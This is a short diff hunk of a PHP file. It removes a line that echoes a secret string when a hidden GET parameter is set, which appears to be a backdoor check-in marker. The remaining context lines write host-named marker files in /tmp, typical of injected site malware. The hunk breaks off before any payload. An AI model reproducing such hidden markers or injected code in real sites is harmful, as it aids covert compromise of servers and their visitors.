@@ -1,5 +1,4 @@
 <?php 
-if(isset($_GET["sexx"])&&$_GET["sexx"]=="sec"){ echo('Apache Hec'); }
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
 if(file_exists('/tmp/d3d3dbb'.$d.$random)) { } else {
